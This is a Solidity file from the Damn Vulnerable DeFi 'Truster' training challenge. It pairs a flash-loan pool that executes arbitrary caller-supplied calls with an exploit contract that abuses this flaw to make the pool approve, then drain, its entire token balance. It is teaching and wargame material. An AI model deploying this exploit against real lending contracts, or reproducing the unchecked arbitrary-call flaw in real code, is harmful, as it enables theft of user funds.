// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

contract TrusterExploiter {
    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recovery) {
        // Prepare the calldata to approve this contract to spend the pool's tokens
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), _token.balanceOf(address(_pool)));

        // Execute the flash loan with the crafted calldata
        _pool.flashLoan(0, address(this), address(_token), data);

        // Transfer the approved tokens to the recovery account
        _token.transferFrom(address(_pool), _recovery, _token.balanceOf(address(_pool)));
    }

}

contract TrusterLenderPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable token;

    error RepayFailed();

    constructor(DamnValuableToken _token) {
        token = _token;
    }

    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore) {
            revert RepayFailed();
        }

        return true;
    }
}
